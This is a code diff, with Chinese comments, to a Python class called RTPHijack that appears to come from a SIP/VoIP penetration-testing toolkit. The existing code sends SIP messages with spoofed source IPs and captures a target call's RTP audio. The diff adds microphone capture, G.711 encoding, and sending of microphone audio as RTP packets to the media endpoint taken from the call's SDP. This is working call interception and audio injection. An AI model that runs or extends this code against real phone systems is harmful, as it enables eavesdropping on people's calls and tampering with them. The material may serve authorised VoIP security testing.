@@ -17,6 +17,7 @@ import os
 import re
 import struct
 import io
+import math
 from datetime import datetime
 from scapy.all import IP, UDP, Raw, send, sniff
 from scapy.arch import get_windows_if_list  # Windows系统
@@ -109,7 +110,7 @@ class RTPHijack:
         self.user_agent = "pplsip"
         self.localip = ""
         self.spoof_ip = ""  # 伪造的源IP地址
-        
+        self.cseq = "2000"
         # RTP相关设置
         self.rtp_target_ip = ""  # 目标RTP IP地址（从SDP中获取）
         self.rtp_target_port = 0  # 目标RTP端口（从SDP中获取）
@@ -136,6 +137,16 @@ class RTPHijack:
         self.audio_buffer = []  # 音频缓冲区
         self.audio_buffer_lock = threading.Lock()  # 用于同步访问音频缓冲区
         
+        # 麦克风采集相关设置
+        self.enable_mic_capture = False  # 是否启用麦克风采集
+        self.mic_target_ip = ""  # 目标RTP IP地址
+        self.mic_target_port = 0  # 目标RTP端口
+        self.mic_payload_type = 0  # 默认使用PCMU
+        self.mic_stream = None  # 麦克风音频流
+        self.mic_thread = None  # 麦克风采集线程
+        self.mic_running = False  # 麦克风采集状态
+        self.rtp_need_port = False  # 是否需要RTP端口
+        
         self.c = Color()
 
     def start(self):
@@ -158,7 +169,13 @@ class RTPHijack:
             if self.proto != "UDP":
                 print(f"{self.c.BRED}IP欺骗仅适用于UDP协议，切换到UDP。")
                 self.proto = "UDP"
-        
+                
+        if not self.mic_target_ip or self.mic_target_ip == "":
+            self.mic_target_ip = self.ip
+            
+        if not self.mic_target_port or self.mic_target_port == "":
+            self.rtp_need_port = True
+            
         # 获取本地IP
         local_ip = self.localip
         if self.localip == "":
@@ -188,11 +205,19 @@ class RTPHijack:
             print(f"{self.c.BWHITE}[✓] 实时音频播放: {self.c.GREEN}已启用")
         else:
             print(f"{self.c.BWHITE}[✓] 实时音频播放: {self.c.BRED}未启用 (需要PyAudio)")
+        if self.enable_mic_capture:
+            print(f"{self.c.BWHITE}[✓] 麦克风采集: {self.c.GREEN}已启用")
+        else:
+            print(f"{self.c.BWHITE}[✓] 麦克风采集: {self.c.BRED}未启用 (需要PyAudio)")
         print(self.c.WHITE)
         
         # 初始化音频播放（如果启用）
         if self.enable_live_playback:
             self.init_audio_playback()
+        
+        # 如果启用了麦克风采集，启动麦克风采集线程
+        if self.enable_mic_capture:
+            self.start_mic_capture()
         
         # 创建socket或使用scapy
         if not self.use_scapy:
@@ -321,9 +346,10 @@ class RTPHijack:
                             # 从SDP中提取RTP信息（仅用于记录目标RTP地址）
                             sdp_info = extract_rtp_info(resp.decode())
                             if sdp_info:
-                                self.rtp_target_ip = sdp_info.get("ip", "")
-                                self.rtp_target_port = int(sdp_info.get("port", 0))
-                                print(f"{self.c.BWHITE}[✓] 从SDP中提取RTP信息: {self.c.GREEN}{self.rtp_target_ip}:{self.rtp_target_port}")
+                                self.mic_target_ip = sdp_info.get("ip", "")
+                                self.mic_target_port = int(sdp_info.get("port", 0))
+                                self.rtp_need_port = False
+                                print(f"{self.c.BWHITE}[✓] 从SDP中提取RTP信息: {self.c.GREEN}{self.mic_target_ip}:{self.mic_target_port}")
                     
                     # 如果收到200 OK，发送ACK
                     if headers["response_code"] == "200":
@@ -345,7 +371,7 @@ class RTPHijack:
                             branch,
                             self.call_id,
                             self.from_tag,
-                            "1",
+                            self.cseq,
                             to_tag,
                             "",
                             1,
@@ -382,7 +408,8 @@ class RTPHijack:
             # 停止RTP捕获
             self.rtp_running = False
             print(f"{self.c.BWHITE}[*] RTP捕获结束，共捕获 {len(self.captured_packets)} 个RTP包")
-            
+            # 停止麦克风采集
+            self.stop_mic_capture()
             # 处理捕获的音频
             self.process_captured_audio()
             
@@ -450,7 +477,7 @@ class RTPHijack:
             branch,                # branch
             call_id,               # callid
             from_tag,              # tag
-            "1",                   # cseq
+            self.cseq,             # cseq
             self.to_tag,           # totag
             "",                    # digest
             1,                     # auth_type
@@ -494,7 +521,8 @@ class RTPHijack:
             # 停止RTP捕获
             self.rtp_running = False
             print(f"{self.c.BWHITE}[*] RTP捕获结束，共捕获 {len(self.captured_packets)} 个RTP包")
-            
+            # 停止麦克风采集
+            self.stop_mic_capture()
             # 处理捕获的音频
             self.process_captured_audio()
             
@@ -546,55 +574,83 @@ class RTPHijack:
         """处理捕获的RTP包"""
         try:
             if pkt.haslayer(UDP) and pkt.haslayer(Raw):
-                # 提取RTP负载
-                raw_payload = bytes(pkt[Raw])
-                
-                # 验证这是否是有效的RTP包（简单验证）
-                if len(raw_payload) >= 12 and (raw_payload[0] & 0xC0) == 0x80:  # RTP版本2
-                    # 提取RTP头部信息
-                    rtp_header = raw_payload[:12]
-                    payload_type = raw_payload[1] & 0x7F
-                    sequence = (raw_payload[2] << 8) | raw_payload[3]
-                    timestamp = struct.unpack('>I', raw_payload[4:8])[0]
-                    ssrc = struct.unpack('>I', raw_payload[8:12])[0]
+                if pkt[IP].src == self.ip:
+                    # 提取RTP负载
+                    raw_payload = bytes(pkt[Raw])
                     
-                    # 提取音频数据
-                    audio_data = raw_payload[12:]
-                    
-                    # 保存包信息
-                    packet_info = {
-                        'sequence': sequence,
-                        'timestamp': timestamp,
-                        'ssrc': ssrc,
-                        'payload_type': payload_type,
-                        'audio_data': audio_data
-                    }
-                    
-                    self.captured_packets.append(packet_info)
-                    
-                    # 实时处理音频数据进行播放
-                    if self.enable_live_playback and self.audio_stream:
-                        pcm_data = None
+                    # 验证这是否是有效的RTP包（简单验证）
+                    # 检查是否为RTP包：版本号为2(0x80)，长度至少12字节，且第一个字节的高2位为10
+                    if len(raw_payload) >= 12 and (raw_payload[0] & 0xC0) == 0x80:  # RTP版本2
+                        # 这是RTP包
+                        # 提取RTP头部信息
+                        rtp_header = raw_payload[:12]
+                        payload_type = raw_payload[1] & 0x7F
+                        sequence = (raw_payload[2] << 8) | raw_payload[3]
+                        timestamp = struct.unpack('>I', raw_payload[4:8])[0]
+                        ssrc = struct.unpack('>I', raw_payload[8:12])[0]
                         
-                        # 将编码的音频数据转换为PCM格式
-                        if payload_type == 0:  # PCMU
-                            pcm_data = self.ulaw2linear(audio_data)
-                            # 确保数据长度是偶数（16位采样）
-                            if len(pcm_data) % 2 != 0:
-                                pcm_data = pcm_data[:-1]
-                        elif payload_type == 8:  # PCMA
-                            pcm_data = self.alaw2linear(audio_data)
-                            # 确保数据长度是偶数（16位采样）
-                            if len(pcm_data) % 2 != 0:
-                                pcm_data = pcm_data[:-1]
+                        # 提取音频数据
+                        audio_data = raw_payload[12:]
                         
-                        # 如果成功转换了数据，将其添加到播放缓冲区
-                        if pcm_data:
-                            with self.audio_buffer_lock:
-                                self.audio_buffer.append(pcm_data)
+                        # 保存包信息
+                        packet_info = {
+                            'sequence': sequence,
+                            'timestamp': timestamp,
+                            'ssrc': ssrc,
+                            'payload_type': payload_type,
+                            'audio_data': audio_data
+                        }
+                        
+                        self.captured_packets.append(packet_info)
+                        
+                        # 实时处理音频数据进行播放
+                        if self.enable_live_playback and self.audio_stream:
+                            pcm_data = None
+                            
+                            # 将编码的音频数据转换为PCM格式
+                            if payload_type == 0:  # PCMU
+                                pcm_data = self.ulaw2linear(audio_data)
+                                # 确保数据长度是偶数（16位采样）
+                                if len(pcm_data) % 2 != 0:
+                                    pcm_data = pcm_data[:-1]
+                            elif payload_type == 8:  # PCMA
+                                pcm_data = self.alaw2linear(audio_data)
+                                # 确保数据长度是偶数（16位采样）
+                                if len(pcm_data) % 2 != 0:
+                                    pcm_data = pcm_data[:-1]
+                            
+                            # 如果成功转换了数据，将其添加到播放缓冲区
+                            if pcm_data:
+                                with self.audio_buffer_lock:
+                                    self.audio_buffer.append(pcm_data)
+                        
+                        if len(self.captured_packets) % 50 == 0:
+                            print(f"{self.c.BWHITE}[+] 已捕获 {len(self.captured_packets)} 个RTP包")
                     
-                    if len(self.captured_packets) % 50 == 0:
-                        print(f"{self.c.BWHITE}[+] 已捕获 {len(self.captured_packets)} 个RTP包")
+                    elif len(raw_payload) > 4 and (raw_payload[:4] == b'SIP/' or raw_payload.startswith(b'INVITE') or 
+                          raw_payload.startswith(b'ACK') or raw_payload.startswith(b'BYE') or 
+                          raw_payload.startswith(b'CANCEL') or raw_payload.startswith(b'OPTIONS') or
+                          raw_payload.startswith(b'REGISTER')):
+                        # 这是SIP信令包，需要单独处理
+                        try:
+                            sip_message = raw_payload.decode('utf-8', errors='ignore')
+                            print(f"{self.c.BGREEN}[SIP] 收到SIP信令: {sip_message.splitlines()[0]}")
+                            # 这里可以添加更多SIP信令处理逻辑
+                            #如果收到200 OK，解析里面携带的SDP信息
+                            if sip_message.startswith("200 OK"):
+                                sdp_info = extract_rtp_info(sip_message)
+                                if sdp_info:
+                                    self.mic_target_ip = sdp_info.get("ip", "")
+                                    self.mic_target_port = int(sdp_info.get("port", 0))
+                                    self.rtp_need_port = False
+                                    print(f"{self.c.BWHITE}[✓] 从SDP中提取RTP信息: {self.c.GREEN}{self.mic_target_ip}:{self.mic_target_port}")
+                        except Exception as e:
+                            print(f"{self.c.RED}[!] 处理SIP信令错误: {str(e)}{self.c.WHITE}")
+                            return
+                    else:
+                        # 既不是RTP包也不是SIP信令，忽略
+                        return
+                        
         
         except Exception as e:
             print(f"{self.c.RED}[!] 处理RTP包错误: {str(e)}{self.c.WHITE}")
@@ -788,6 +844,170 @@ class RTPHijack:
         
         return result
     
+    def linear2ulaw(self, pcm_data):
+        """
+        将线性PCM数据转换为G.711 μ-law编码
+        使用标准的μ-law编码算法
+        """
+        result = bytearray()
+        
+        # 每两个字节组成一个16位PCM样本
+        for i in range(0, len(pcm_data), 2):
+            if i + 1 >= len(pcm_data):
+                break
+                
+            # 将两个字节转换为16位有符号整数
+            sample = struct.unpack('<h', pcm_data[i:i+2])[0]
+            
+            # 1. 获取符号位和绝对值
+            sign = (sample >> 8) & 0x80
+            if sample < 0:
+                sample = -sample
+                sign = 0x80
+            
+            # 2. 添加偏置并取对数（G.711 PCMU算法）
+            sample += 33
+            
+            # 3. 限制最大值
+            if sample > 32767:
+                sample = 32767
+            
+            # 4. 使用查找表进行转换
+            # PCMU编码包括8位编码：符号(1位) + 指数(3位) + 尾数(4位)
+            if sample >= 8159:
+                exponent = 0x7  # 指数111
+            elif sample >= 4079:
+                exponent = 0x6  # 指数110
+            elif sample >= 2039:
+                exponent = 0x5  # 指数101
+            elif sample >= 1019:
+                exponent = 0x4  # 指数100
+            elif sample >= 509:
+                exponent = 0x3  # 指数011
+            elif sample >= 253:
+                exponent = 0x2  # 指数010
+            elif sample >= 125:
+                exponent = 0x1  # 指数001
+            else:
+                exponent = 0x0  # 指数000
+            
+            # 5. 计算尾数
+            mantissa = (sample >> (exponent + 3)) & 0x0F
+            
+            # 6. 组合指数和尾数
+            value = (sign | (exponent << 4) | mantissa)
+            
+            # 7. 按照PCMU标准反转所有位并输出
+            result.append(~value & 0xFF)
+        
+        return result
+
+    def linear2alaw(self, pcm_data):
+        """
+        将线性PCM数据转换为G.711 A-law编码
+        使用标准的A-law编码算法
+        """
+        result = bytearray()
+        
+        # 每两个字节组成一个16位PCM样本
+        for i in range(0, len(pcm_data), 2):
+            if i + 1 >= len(pcm_data):
+                break
+                
+            # 将两个字节转换为16位有符号整数
+            sample = struct.unpack('<h', pcm_data[i:i+2])[0]
+            
+            # 1. 获取符号位和绝对值
+            sign = 0
+            if sample < 0:
+                sample = -sample
+                sign = 0x80
+            
+            # 2. 将样本限制到13位精度
+            sample >>= 3
+            
+            # 3. A-Law分段压缩编码
+            if sample >= 256:
+                # 对于较大的值，使用对数段
+                exponent = 0
+                while sample >= 512:
+                    exponent += 1
+                    sample >>= 1
+                
+                # 提取尾数的高4位
+                mantissa = (sample >> 4) & 0x0F
+                segment = exponent + 1  # 1-7段
+                
+                # 组合段号和尾数
+                alaw = (segment << 4) | mantissa
+            else:
+                # 对于较小的值，直接使用前4位
+                alaw = sample >> 4
+            
+            # 4. 设置符号位（最高位）
+            alaw |= sign
+            
+            # 5. 按照A-Law标准进行位反转和异或操作 (0x55 = 0b01010101)
+            result.append(alaw ^ 0x55)
+        
+        return result
+
+    def convert_audio_to_rtp(self, input_file, output_file, payload_type):
+        """
+        将PCM音频文件转换为指定格式的RTP数据
+        
+        Args:
+            input_file (str): PCM格式的输入文件路径
+            output_file (str): 输出的RTP数据文件路径
+            payload_type (int): RTP负载类型（0=PCMU, 8=PCMA）
+        """
+        try:
+            print(f"{self.c.BWHITE}[*] 开始音频格式转换...")
+            print(f"{self.c.BWHITE}    输入文件: {input_file}")
+            print(f"{self.c.BWHITE}    输出文件: {output_file}")
+            print(f"{self.c.BWHITE}    目标格式: {'PCMU' if payload_type == 0 else 'PCMA'}")
+            
+            # 检查输入文件是否为WAV格式
+            if input_file.lower().endswith('.wav'):
+                # 读取WAV文件
+                with wave.open(input_file, 'rb') as wav_file:
+                    # 验证音频格式
+                    if wav_file.getnchannels() != 1:
+                        raise ValueError("只支持单声道WAV文件")
+                    if wav_file.getsampwidth() != 2:
+                        raise ValueError("只支持16位采样WAV文件")
+                    if wav_file.getframerate() != 8000:
+                        raise ValueError("只支持8kHz采样率WAV文件")
+                    
+                    # 读取PCM数据
+                    pcm_data = wav_file.readframes(wav_file.getnframes())
+            else:
+                # 读取原始PCM文件
+                with open(input_file, 'rb') as f:
+                    pcm_data = f.read()
+            
+            # 根据负载类型进行转换
+            if payload_type == 0:  # PCMU
+                rtp_data = self.linear2ulaw(pcm_data)
+            elif payload_type == 8:  # PCMA
+                rtp_data = self.linear2alaw(pcm_data)
+            else:
+                raise ValueError(f"不支持的负载类型: {payload_type}")
+            
+            # 保存转换后的数据
+            with open(output_file, 'wb') as f:
+                f.write(rtp_data)
+            
+            print(f"{self.c.BGREEN}[✓] 转换完成")
+            print(f"{self.c.BWHITE}    - 输入文件大小: {len(pcm_data)} 字节")
+            print(f"{self.c.BWHITE}    - 输出文件大小: {len(rtp_data)} 字节")
+            print(f"{self.c.BWHITE}    - 音频时长: {len(pcm_data) / 16000:.2f} 秒")
+            
+        except Exception as e:
+            print(f"{self.c.RED}[!] 转换失败: {str(e)}{self.c.WHITE}")
+            import traceback
+            traceback.print_exc()
+
     def send_with_scapy(self, msg, host, lport, method_suffix=""):
         """使用scapy发送带有伪造源IP的SIP消息"""
         target_ip = host[0]
@@ -824,7 +1044,11 @@ class RTPHijack:
         # 停止音频播放
         if self.enable_live_playback:
             self.stop_audio_playback()
-            
+        
+        # 停止麦克风采集
+        if self.enable_mic_capture:
+            self.stop_mic_capture()
+        
         print(self.c.WHITE)
 
     def test_pcmu_to_wav(self, input_file, output_file):
@@ -864,10 +1088,157 @@ class RTPHijack:
             import traceback
             traceback.print_exc()
 
+    def start_mic_capture(self):
+        """启动麦克风采集"""
+        if not PYAUDIO_AVAILABLE:
+            print(f"{self.c.BRED}[!] PyAudio未安装，无法使用麦克风采集功能")
+            return
+            
+        try:
+            # 初始化PyAudio
+            if not self.pyaudio_instance:
+                self.pyaudio_instance = pyaudio.PyAudio()
+            
+            # 设置麦克风采集参数
+            self.mic_sample_rate = 8000  # 8kHz采样率
+            self.mic_channels = 1  # 单声道
+            self.mic_chunk_size = 160  # 20ms @ 8kHz = 160个采样点
+            
+            # 创建麦克风输入流
+            self.mic_stream = self.pyaudio_instance.open(
+                format=pyaudio.paInt16,
+                channels=self.mic_channels,
+                rate=self.mic_sample_rate,
+                input=True,
+                frames_per_buffer=self.mic_chunk_size
+            )
+            
+            # 创建WAV文件
+            self.mic_wav_file = wave.open('mic_capture.wav', 'wb')
+            self.mic_wav_file.setnchannels(self.mic_channels)
+            self.mic_wav_file.setsampwidth(2)  # 16位采样
+            self.mic_wav_file.setframerate(self.mic_sample_rate)
+            
+            # 启动麦克风采集线程
+            self.mic_running = True
+            self.mic_thread = threading.Thread(target=self.mic_capture_loop)
+            self.mic_thread.daemon = True
+            self.mic_thread.start()
+            
+            print(f"{self.c.BGREEN}[✓] 麦克风采集已启动")
+            print(f"{self.c.BWHITE}    - 目标IP: {self.mic_target_ip}")
+            print(f"{self.c.BWHITE}    - 目标端口: {self.mic_target_port}")
+            print(f"{self.c.BWHITE}    - 负载类型: {'PCMU' if self.mic_payload_type == 0 else 'PCMA'}")
+            print(f"{self.c.BWHITE}    - 音频保存: mic_capture.wav")
+            
+        except Exception as e:
+            print(f"{self.c.RED}[!] 启动麦克风采集失败: {str(e)}{self.c.WHITE}")
+            self.stop_mic_capture()
+
+    def mic_capture_loop(self):
+        """麦克风采集循环"""
+        try:
+            while self.mic_running:
+                if self.rtp_need_port:
+                    continue
+                
+                # 从麦克风读取音频数据
+                mic_data = self.mic_stream.read(self.mic_chunk_size)
+                    
+                # 保存到WAV文件
+                if hasattr(self, 'mic_wav_file') and self.mic_wav_file is not None:
+                    self.mic_wav_file.writeframes(mic_data)
+                
+                # 转换为RTP格式
+                if self.mic_payload_type == 0:  # PCMU
+                    rtp_data = self.linear2ulaw(mic_data)
+                elif self.mic_payload_type == 8:  # PCMA
+                    rtp_data = self.linear2alaw(mic_data)
+                else:
+                    continue
+                
+                # 构造RTP包
+                rtp_packet = self.create_rtp_packet(rtp_data)
+                
+                # 发送RTP包
+                self.send_rtp_packet(rtp_packet)
+                
+        except Exception as e:
+            print(f"{self.c.RED}[!] 麦克风采集错误: {str(e)}{self.c.WHITE}")
+        finally:
+            self.stop_mic_capture()
+
+    def create_rtp_packet(self, payload):
+        """创建RTP包"""
+        # RTP头部 (12字节)
+        rtp_header = bytearray()
+        
+        # 版本(2位)、填充(1位)、扩展(1位)、CSRC计数(4位)
+        rtp_header.append(0x80)
+        
+        # 标记(1位)、负载类型(7位)
+        rtp_header.append(self.mic_payload_type)
+        
+        # 序列号(16位)
+        rtp_header.extend(struct.pack('>H', 0))  # 序列号从0开始
+        
+        # 时间戳(32位)
+        rtp_header.extend(struct.pack('>I', 0))  # 时间戳从0开始
+        
+        # SSRC(32位)
+        rtp_header.extend(struct.pack('>I', 0x12345678))  # 固定的SSRC
+        
+        # 组合RTP头部和负载
+        return rtp_header + payload
+
+    def send_rtp_packet(self, rtp_packet):
+        """发送RTP包"""
+        try:
+            if self.use_scapy:
+                # 使用scapy发送
+                packet = IP(src=self.localip, dst=self.mic_target_ip) / \
+                        UDP(sport=self.rtp_local_port, dport=self.mic_target_port) / \
+                        Raw(load=rtp_packet)
+                send(packet, verbose=0)
+            else:
+                # 使用socket发送
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.sendto(rtp_packet, (self.mic_target_ip, self.mic_target_port))
+                sock.close()
+        except Exception as e:
+            print(f"{self.c.RED}[!] 发送RTP包失败: {str(e)}{self.c.WHITE}")
+
+    def stop_mic_capture(self):
+        """停止麦克风采集"""
+        self.mic_running = False
+        
+        if self.mic_stream:
+            try:
+                self.mic_stream.stop_stream()
+                self.mic_stream.close()
+                self.mic_stream = None
+                print(f"{self.c.BWHITE}[*] 麦克风采集已停止")
+            except Exception as e:
+                print(f"{self.c.RED}[!] 停止麦克风采集时出错: {str(e)}{self.c.WHITE}")
+        
+        # 关闭WAV文件
+        if hasattr(self, 'mic_wav_file') and self.mic_wav_file is not None:
+            try:
+                self.mic_wav_file.close()
+                self.mic_wav_file = None
+                print(f"{self.c.BWHITE}[*] 音频文件已保存")
+            except Exception as e:
+                print(f"{self.c.RED}[!] 关闭音频文件时出错: {str(e)}{self.c.WHITE}")
+
 if __name__ == "__main__":
     # 测试PCMU到WAV的转换
     hijack = RTPHijack()
     # 使用原始字符串表示法处理Windows路径
-    input_file = r"C:\workspace\IMS\Test Tools\sippts\sippts\Saved RTP Audio.raw"
-    output_file = "test111.wav"
-    hijack.test_pcmu_to_wav(input_file, output_file)
+    # input_file = r"C:\workspace\IMS\Test Tools\sippts\sippts\Saved RTP Audio.raw"
+    # output_file = "test111.wav"
+    # hijack.test_pcmu_to_wav(input_file, output_file)
+    
+    # 测试PCM到PCMU的转换
+    pcm_file = r"C:\workspace\IMS\Test Tools\sippts\sippts\hijacked_audio.wav"
+    pcmu_file = "test.pcmu"
+    hijack.convert_audio_to_rtp(pcm_file, pcmu_file, 0)  # 0 = PCMU
